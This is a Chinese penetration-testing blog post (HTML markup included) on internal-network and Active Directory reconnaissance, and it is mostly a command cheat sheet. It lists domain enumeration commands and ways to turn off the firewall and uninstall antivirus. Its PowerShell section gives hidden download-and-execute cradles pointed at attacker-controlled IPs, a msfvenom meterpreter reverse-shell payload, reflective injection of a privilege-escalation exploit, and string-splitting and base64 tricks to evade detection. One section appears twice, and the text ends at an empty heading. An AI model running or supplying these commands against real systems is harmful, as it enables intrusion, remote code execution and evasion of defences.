fa-x-twitter social-icon" aria-hidden="true"></i><span class="absolute inset-0 -z-10 -translate-x-full translate-y-full rounded-xl transition-transform duration-300 group-hover:translate-x-0 group-hover:translate-y-0"></span></a></div><div><a class="social-link flex-center group relative overflow-hidden rounded-xl px-1.5 py-1 transition-all duration-300 group-hover:scale-105" style="--link-color:#55acd5" data-platform="email" href="mailto:2517029339@qq.com" title="Email" data-tooltip-interactive="false" data-tooltip-placement="top" aria-label="Email"><i class="fa-regular fa-envelope social-icon" aria-hidden="true"></i><span class="absolute inset-0 -z-10 -translate-x-full translate-y-full rounded-xl transition-transform duration-300 group-hover:translate-x-0 group-hover:translate-y-0"></span></a></div></div><div class="text-muted-foreground mt-3 flex justify-center text-center text-sm/4 whitespace-nowrap select-none dark:text-white/80"><a href="/blog" class="hover:text-blue flex cursor-pointer flex-col gap-2 p-1 transition"><span class="text-lg/5 font-bold">29</span>文章</a><div class="bg-muted-foreground mx-3 w-px"></div><a href="/blog/categories" aria-label="分类" class="hover:text-blue"><p class="flex cursor-pointer flex-col gap-2 p-1 transition"><span class="text-lg/5 font-bold">7</span>分类</p></a><div class="bg-muted-foreground mx-3 w-px"></div><a href="/blog/tags" class="hover:text-blue flex cursor-pointer flex-col gap-2 p-1 transition"><span class="text-lg/5 font-bold">40</span>标签</a></div><div class="mt-6 flex w-full flex-col items-center gap-2.5"><a href="/blog" aria-label="文章" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-pen-nib" aria-hidden="true"></i>文章</a><a href="/blog/categories" aria-label="分类" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-layer-group" aria-hidden="true"></i>分类</a><a href="/blog/tags" aria-label="标签" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-tags" aria-hidden="true"></i>标签</a><a href="/blog/archives" aria-label="归档" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-solid fa-flag" aria-hidden="true"></i>归档</a><a href="/blog/friends" aria-label="友链" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-link" aria-hidden="true"></i>友链</a><a href="/blog/about" aria-label="关于" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-user" aria-hidden="true"></i>关于</a></div></div></div><div class="sider-slot hidden" data-slot-type="directory"><nav class="toc-container max-h-[90dvh] overflow-auto " aria-label="文章目录"><div class="space-y-1 pr-2"><div class="heading-tree-item relative"><a href="#windows安全标识符sid" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Windows安全标识符SID"><span class="heading-text block flex-1 truncate leading-relaxed">Windows安全标识符SID</span></a></div><div class="heading-tree-item relative"><a href="#临时http服务架设" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="临时HTTP服务架设"><span class="heading-text block flex-1 truncate leading-relaxed">临时HTTP服务架设</span></a></div><div class="heading-tree-item relative"><a href="#cmd" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Cmd"><span class="heading-text block flex-1 truncate leading-relaxed">Cmd</span></a></div><div class="heading-tree-item relative"><a href="#wmi" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Wmi"><span class="heading-text block flex-1 truncate leading-relaxed">Wmi</span></a></div><div class="heading-tree-item relative"><a href="#wmi-1" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Wmi"><span class="heading-text block flex-1 truncate leading-relaxed">Wmi</span></a></div><div class="heading-tree-item relative"><a href="#powershell基础操作" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Powershell基础操作"><span class="heading-text block flex-1 truncate leading-relaxed">Powershell基础操作</span></a></div><div class="heading-tree-item relative"><a href="#powerview" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Powerview"><span class="heading-text block flex-1 truncate leading-relaxed">Powerview</span></a></div><div class="heading-tree-item relative"><a href="#linux" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Linux"><span class="heading-text block flex-1 truncate leading-relaxed">Linux</span></a></div><div class="heading-tree-item relative"><a href="#addomain" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="ADDomain"><span class="heading-text block flex-1 truncate leading-relaxed">ADDomain</span></a></div><div class="heading-tree-item relative"><a href="#bloodhoundad" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="BloodHoundAD"><span class="heading-text block flex-1 truncate leading-relaxed">BloodHoundAD</span></a></div></div></nav></div><div class="sider-slot hidden" data-slot-type="series"><div class="flex flex-col gap-1"><a href="/blog/post/29" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50 text-primary font-medium"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-primary"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-primary">内网信息获取</span></a><a href="/blog/post/28" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">端口映射和转发</span></a></div></div></div><div class="border-border mt-4 flex flex-col gap-3 border-t pt-4 md:mt-0 md:pt-2 w-full px-2"><div class="flex items-center justify-between gap-2"><div class="max-w-[45%] flex-1"></div><a href="/blog/post/28" class="group flex items-center gap-1.5 rounded-md px-2 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary max-w-[45%] min-w-0 flex-1 justify-end text-right" title="端口映射和转发"><span class="truncate text-xs">端口映射和转发</span><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4 shrink-0" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path></svg></a></div><div class="flex justify-center gap-2"><button class="flex items-center justify-center gap-1.5 rounded-md px-3 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary text-xs" title="回到顶部" aria-label="回到顶部"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M11.9999 10.8284L7.0502 15.7782L5.63599 14.364L11.9999 8L18.3639 14.364L16.9497 15.7782L11.9999 10.8284Z"></path></svg>回到顶部</button><button class="flex items-center justify-center gap-1.5 rounded-md px-3 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary text-xs" title="滚到底部" aria-label="滚到底部"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M11.9999 13.1714L16.9497 8.22168L18.3639 9.63589L11.9999 15.9999L5.63599 9.63589L7.0502 8.22168L11.9999 13.1714Z"></path></svg>滚到底部</button></div></div><div class="mt-auto w-full rounded-full pt-4 sticky bottom-0"><div class="bg-primary h-1 origin-left rounded-full scale-x-0"></div></div><!--astro:end--></astro-island> </div> <div class="flex min-w-0 grow flex-col gap-8 md:w-full">     <div class="shadow-box bg-gradient-start flex flex-col gap-2 px-10 py-8 tablet:px-6 tablet:pt-6 tablet:pb-2"> <!-- Breadcrumb Navigation --> <nav class="text-muted-foreground flex items-center gap-2 text-sm"> <div class="flex items-center gap-1"> <!-- Home Icon and Link --> <i class="fa-solid fa-house-chimney text-sm" aria-hidden="true"></i> <a href="/blog" aria-label="返回首页"> <span class="hover:text-blue transition-colors duration-300">首页</span> </a> </div> <!-- Category Breadcrumbs -->  <i class="fa-solid fa-angle-right text-muted-foreground/60 text-sm" aria-hidden="true"></i> <a href="/blog/categories/Penetration" class="hover:text-blue transition-colors duration-300 " aria-label="前往Penetration分类"> Penetration </a>  <i class="fa-solid fa-angle-right text-muted-foreground/60 text-sm" aria-hidden="true"></i> <a href="/blog/categories/Penetration/%E5%86%85%E7%BD%91%E5%92%8C%E5%9F%9F" class="hover:text-blue transition-colors duration-300 text-primary bg-primary/10 hover:text-primary hover:bg-primary/20 rounded-full px-2.5 py-1" aria-label="前往内网和域分类"> 内网和域 </a>  </nav> <astro-island uid="Z2sUCMl" prefix="r4" component-url="/_astro/SummaryPanel.DXjW2U82.js" component-export="SummaryPanel" renderer-url="/_astro/client.lBR8ML2S.js" props="{&quot;summary&quot;:[0,&quot;Windows安全标识符SID 临时HTTP服务架设 Cmd&quot;],&quot;source&quot;:[0,&quot;auto&quot;],&quot;className&quot;:[0,&quot;mt-2&quot;]}" ssr client="visible" opts="{&quot;name&quot;:&quot;SummaryPanel&quot;,&quot;value&quot;:true}" await-children><div class="overflow-hidden rounded-lg mt-2"><button class="bg-foreground/5 flex w-full cursor-pointer items-center justify-between px-4 py-3 transition-all duration-250 hover:bg-foreground/10 rounded-lg" aria-expanded="false" aria-controls="summary-panel-content"><div class="text-muted-foreground flex items-center gap-1.5 text-sm font-medium"><span class="transition-transform duration-300"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="text-primary size-4" aria-hidden="true"><path d="M20 22H4C3.44772 22 3 21.5523 3 21V3C3 2.44772 3.44772 2 4 2H20C20.5523 2 21 2.44772 21 3V21C21 21.5523 20.5523 22 20 22ZM19 20V4H5V20H19ZM7 6H11V10H7V6ZM7 12H17V14H7V12ZM7 16H17V18H7V16ZM13 7H17V9H13V7Z"></path></svg></span>摘要</div><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="text-muted-foreground size-4 transition-transform duration-300" aria-hidden="true"><path d="M12 16L6 10H18L12 16Z"></path></svg></button><div id="summary-panel-content" class="grid transition-[grid-template-rows] duration-300 ease-out" style="grid-template-rows:0fr"><div class="overflow-hidden"><div class="bg-foreground/5 text-muted-foreground rounded-b-lg px-4 py-4 text-sm leading-relaxed"><span class="sr-only">Windows安全标识符SID 临时HTTP服务架设 Cmd</span><p aria-hidden="true"><span></span></p></div></div></div></div><!--astro:end--></astro-island> <article class="prose md:prose-sm dark:prose-invert"> <div class="custom-content"> <h1 id="windows安全标识符sid">Windows安全标识符SID<a class="anchor-link" href="#windows安全标识符sid"><span class="icon icon-link"></span></a></h1>

















































<table><thead><tr><th>相对标识符</th><th>说明</th></tr></thead><tbody><tr><td>500</td><td>管理员</td></tr><tr><td>501</td><td>来宾</td></tr><tr><td>502</td><td>密钥分发中心服务的服务账户</td></tr><tr><td>512</td><td>域管理员</td></tr><tr><td>513</td><td>域用户</td></tr><tr><td>514</td><td>域来宾</td></tr><tr><td>515</td><td>域计算机</td></tr><tr><td>516</td><td>域控制器</td></tr><tr><td>544</td><td>内置管理员</td></tr><tr><td>519</td><td>企业管理员</td></tr></tbody></table>
<h1 id="临时http服务架设">临时HTTP服务架设<a class="anchor-link" href="#临时http服务架设"><span class="icon icon-link"></span></a></h1>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>python2 -m SimpleHTTPServer </span></span>
<span class="line"><span>python3 -m http.server 8080</span></span>
<span class="line"><span>php -S 0.0.0.0:8888</span></span>
<span class="line"><span>openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</span></span>
<span class="line"><span>openssl s_server -key key.pem -cert cert.pem -accept 443 –WWW</span></span>
<span class="line"><span>ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port = 8888,:DocumentRoot = Dir.pwd).start"</span></span>
<span class="line"><span>ruby -run -e httpd . -p 8888</span></span></code></pre>
<h1 id="cmd">Cmd<a class="anchor-link" href="#cmd"><span class="icon icon-link"></span></a></h1>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>whoami /user 查看当前用户SID</span></span>
<span class="line"><span>net config Workstation 查看当前计算机信息</span></span>
<span class="line"><span>net time /domain 判断主域</span></span>
<span class="line"><span>错误5：存在域，当前不是域用户</span></span>
<span class="line"><span>显示时间：存在域，当前是域内用户</span></span>
<span class="line"><span>找不到域：不存在</span></span>
<span class="line"><span>net view /domain 列出域列表</span></span>
<span class="line"><span>net group "Domain Controllers" /domain查看主域控</span></span>
<span class="line"><span>nltest /DCLIST:zone.com 查看域控</span></span>
<span class="line"><span>net group "domain admins" /domain 查看域管理员</span></span>
<span class="line"><span>net group "enterprise admins" /domain 查看企业管理员列表</span></span>
<span class="line"><span>net localgroup administrators /domain 查看管理组用户</span></span>
<span class="line"><span>net group "domain computers" /domain 查看域成员计算机</span></span>
<span class="line"><span>net accounts /domain 查看密码策略</span></span>
<span class="line"><span>net user /domain查看域内用户</span></span>
<span class="line"><span>net view /domain:dc 查询域内计算机</span></span>
<span class="line"><span>netsh firewall set opmode disable/enable 关闭windows防火墙(win2003)</span></span>
<span class="line"><span>netsh advfirewall set allprofiles state off/on(大于win2003)</span></span>
<span class="line"><span>arp -a查看arp表</span></span>
<span class="line"><span>net start 查看服务</span></span>
<span class="line"><span>route print查看路由表</span></span>
<span class="line"><span>query user查看登录机器的用户的连接状态</span></span>
<span class="line"><span>tasklist /v 查看域管理员进程</span></span>
<span class="line"><span>dsquery server查询域控制器</span></span>
<span class="line"><span>dsquery computer 查询域内机器</span></span>
<span class="line"><span>dsquery user 查询域用户</span></span>
<span class="line"><span>dsquery ou 域内组织单位</span></span>
<span class="line"><span>导出域DNS记录，文件保存在C:\Windows\System32\dns\</span></span>
<span class="line"><span>dnscmd /zoneexport zone.com 1.txt</span></span>
<span class="line"><span>导出LDAP数据库</span></span>
<span class="line"><span>LDIFDE -f c:\windows\temp\dump.ldf -n -m</span></span></code></pre>
<h1 id="wmi">Wmi<a class="anchor-link" href="#wmi"><span class="icon icon-link"></span></a></h1>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>wmic OS get Caption,CSDVersion,OSArchitecture,Version系统版本</span></span>
<span class="line"><span>wmic service list brief 列出本机服务</span></span>
<span class="line"><span>wmic process list brief 列出进程</span></span>
<span class="line"><span>wmic process where name="chrome.exe" get executablepath进程路径</span></span>
<span class="line"><span>wmic process get caption,commandline /value1.txt查询所有进程参数</span></span>
<span class="line"><span>wmic process where caption="svchost.exe" get caption,commandline /value 查询某个进程命令行参数</span></span>
<span class="line"><span>创建进程</span></span>
<span class="line"><span>wmic process call create calc</span></span>
<span class="line"><span>wmic process call create "C:\shell.exe"</span></span>
<span class="line"><span>wmic process call create "shutdown.exe -r -f -t 20"</span></span>
<span class="line"><span>结束进程</span></span>
<span class="line"><span>wmic process where name="shell.exe" call terminate</span></span>
<span class="line"><span>wmic process where processid="2345" delete</span></span>
<span class="line"><span>wmic process 2345 call terminate</span></span>
<span class="line"><span>wmic startup list brief 列出自启动程序</span></span>
<span class="line"><span>wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List 查看杀毒软件</span></span>
<span class="line"><span>wmic netuse list brief 列出共享驱动盘</span></span>
<span class="line"><span>wmic ntdomain list brief 查询域控制器</span></span>
<span class="line"><span>wmic useraccount list brief 列出本机管理员及SID</span></span>
<span class="line"><span>wmic qfe list brief 列出补丁列表</span></span>
<span class="line"><span>wmic share get name,path 查看共享</span></span>
<span class="line"><span>wmic startup list brief查看启动项</span></span>
<span class="line"><span>wmic product get name,version 查看安装的软件</span></span>
<span class="line"><span>wmic product where "name like '%360%'" get name 查看程序名</span></span>
<span class="line"><span>wmic product where name="360tray" call uninstall 卸载程序</span></span>
<span class="line"><span>wmic process where "name like '%360%'" get name 查找进程全名</span></span>
<span class="line"><span>wmic product where name="360tray.exe" call terminate 停止程序</span></span>
<span class="line"><span>wmic desktop get screensaversecure,screensavertimeout 查看屏保</span></span></code></pre>
<h1 id="wmi-1">Wmi<a class="anchor-link" href="#wmi-1"><span class="icon icon-link"></span></a></h1>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>wmic OS get Caption,CSDVersion,OSArchitecture,Version系统版本</span></span>
<span class="line"><span>wmic service list brief 列出本机服务</span></span>
<span class="line"><span>wmic process list brief 列出进程</span></span>
<span class="line"><span>wmic process where name="chrome.exe" get executablepath进程路径</span></span>
<span class="line"><span>wmic process get caption,commandline /value1.txt查询所有进程参数</span></span>
<span class="line"><span>wmic process where caption="svchost.exe" get caption,commandline /value 查询某个进程命令行参数</span></span>
<span class="line"><span>创建进程</span></span>
<span class="line"><span>wmic process call create calc</span></span>
<span class="line"><span>wmic process call create "C:\shell.exe"</span></span>
<span class="line"><span>wmic process call create "shutdown.exe -r -f -t 20"</span></span>
<span class="line"><span>结束进程</span></span>
<span class="line"><span>wmic process where name="shell.exe" call terminate</span></span>
<span class="line"><span>wmic process where processid="2345" delete</span></span>
<span class="line"><span>wmic process 2345 call terminate</span></span>
<span class="line"><span>wmic startup list brief 列出自启动程序</span></span>
<span class="line"><span>wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List 查看杀毒软件</span></span>
<span class="line"><span>wmic netuse list brief 列出共享驱动盘</span></span>
<span class="line"><span>wmic ntdomain list brief 查询域控制器</span></span>
<span class="line"><span>wmic useraccount list brief 列出本机管理员及SID</span></span>
<span class="line"><span>wmic qfe list brief 列出补丁列表</span></span>
<span class="line"><span>wmic share get name,path 查看共享</span></span>
<span class="line"><span>wmic startup list brief查看启动项</span></span>
<span class="line"><span>wmic product get name,version 查看安装的软件</span></span>
<span class="line"><span>wmic product where "name like '%360%'" get name 查看程序名</span></span>
<span class="line"><span>wmic product where name="360tray" call uninstall 卸载程序</span></span>
<span class="line"><span>wmic process where "name like '%360%'" get name 查找进程全名</span></span>
<span class="line"><span>wmic product where name="360tray.exe" call terminate 停止程序</span></span>
<span class="line"><span>wmic desktop get screensaversecure,screensavertimeout 查看屏保</span></span></code></pre>
<h1 id="powershell基础操作">Powershell基础操作<a class="anchor-link" href="#powershell基础操作"><span class="icon icon-link"></span></a></h1>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>查看版本$PSVersionTable</span></span></code></pre>
<p><strong>远程执行</strong></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>powershell -nop -w hidden -ep bypass "IEX (New-Object Net.WebClient).DownloadString('');Invoke-xxx"</span></span></code></pre>
<p></p><figure class="markdown-image-wrapper"><img src="https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/100.png" alt="image" loading="lazy" decoding="async" class="markdown-image"></figure><p></p>
<p><strong>加载exe</strong></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>msfvenom生成exe木马</span></span>
<span class="line"><span>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 -f exe  /var/www/html/1.exe  </span></span>
<span class="line"><span>使用powersploit的Invoke-ReflectivePEInjection.ps1脚本</span></span>
<span class="line"><span>powershell.exe -w hidden -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/clymberps/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1');Invoke-ReflectivePEInjection -PEUrl http://192.168.0.107/1.exe -ForceASLR" </span></span></code></pre>
<p><strong>EXE2PS1</strong></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>http://192.168.0.107/ps/powersploit/CodeExecution/Convert-BinaryToString.ps1</span></span>
<span class="line"><span>将exe转换为base64</span></span>
<span class="line"><span>Import-Module .\Convert-BinaryToString.ps1</span></span>
<span class="line"><span>Convert-BinaryToString -FilePath .\ms15051.exe</span></span></code></pre>
<p></p><figure class="markdown-image-wrapper"><img src="https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/101.png" alt="image" loading="lazy" decoding="async" class="markdown-image"></figure><p></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>http://192.168.0.107/ps/powersploit/CodeExecution/Invoke-ReflectivePEInjection.ps1</span></span>
<span class="line"><span>Invoke-ReflectivePEInjection.ps1文件头部添加</span></span>
<span class="line"><span>Function MS15051{</span></span>
<span class="line"><span>&#x3C;#</span></span>
<span class="line"><span>.SYNOPSIS    </span></span>
<span class="line"><span>.EXAMPLE</span></span>
<span class="line"><span>C:\PS MS15051 -Command "whoami"</span></span>
<span class="line"><span>#</span></span>
<span class="line"><span> [CmdletBinding()]</span></span>
<span class="line"><span>    param(</span></span>
<span class="line"><span>        [Parameter(Mandatory = $False)]</span></span>
<span class="line"><span>        [string]</span></span>
<span class="line"><span>        $Command</span></span>
<span class="line"><span>  )</span></span>
<span class="line"><span>$InputString = "文件的base64编码"</span></span>
<span class="line"><span>$PEBytes = [System.Convert]::FromBase64String($InputString)</span></span>
<span class="line"><span>文件尾部添加</span></span>
<span class="line"><span>write-host ("[+] Executing Command: "+$Command)  -foregroundcolor "Green"</span></span>
<span class="line"><span>Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs $Command </span></span>
<span class="line"><span>write-host ("[+] Done !")  -foregroundcolor "Green"</span></span>
<span class="line"><span>}</span></span></code></pre>
<p></p><figure class="markdown-image-wrapper"><img src="https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/102.png" alt="image" loading="lazy" decoding="async" class="markdown-image"></figure><p></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>远程下载执行</span></span>
<span class="line"><span>powershell -nop -w hidden -ep bypass "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.0.107/ps/powersploit/CodeExecution/ms15051.ps1'); MS15051 –Command \"whoami\""</span></span></code></pre>
<p></p><figure class="markdown-image-wrapper"><img src="https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/103.png" alt="image" loading="lazy" decoding="async" class="markdown-image"></figure><p></p>
<p><strong>绕过策略</strong></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>powershell Set-ExecutionPolicy Unrestricted需管理员权限，不受限执行</span></span>
<span class="line"><span>powershell.exe -nop -exec bypass -c "IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/Invoke-xxx.ps1');invoke-xxx"</span></span>
<span class="line"><span>powershell -exec bypass -File ./a.ps1&#x26;Import-Module xxx</span></span></code></pre>
<p><strong>Base64</strong></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>use exploit/multi/script/web_delivery|target=2(PSH)</span></span>
<span class="line"><span>&#x26;</span></span>
<span class="line"><span>cat payload.txt | iconv --to-code UTF-16LE |base64</span></span>
<span class="line"><span>powershell -ep bypass -enc base64code</span></span></code></pre>
<p><strong>写入bat绕过</strong></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>powershell -exec bypass -File ./a.ps1 </span></span>
<span class="line"><span>将该命令保存为c.bat</span></span></code></pre>
<p><strong>拼接拆分字符串</strong></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>powershell.exe  </span></span>
<span class="line"><span>"</span></span>
<span class="line"><span>$c1='powershell -c IEX'; </span></span>
<span class="line"><span>$c2='(New-Object Net.WebClient).Downlo'; </span></span>
<span class="line"><span>$c3='adString("http://192.168.197.192/a.ps1")'; </span></span>
<span class="line"><span>echo ($c1,$c2,$c3) </span></span>
<span class="line"><span>" </span></span>
<span class="line"><span>先将命令拆分为字符串，然后进行拼接。echo修改为IEX执行。</span></span>
<span class="line"><span>powershell $c2='IEX (New-Object Net.WebClient).Downlo';$c3='adString(''http://x.x.x.x/a'')'; $Text=$c2+$c3; IEX(-join $Text)</span></span></code></pre>
<p><strong>Replace替换函数</strong></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>powershell -noexit "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='123(''http://192.168.0.108/1.ps1'')'.Replace('123','adString');IEX ($c1+$c2)" </span></span></code></pre>
<p><strong>HTTP字符拼接绕过</strong></p>
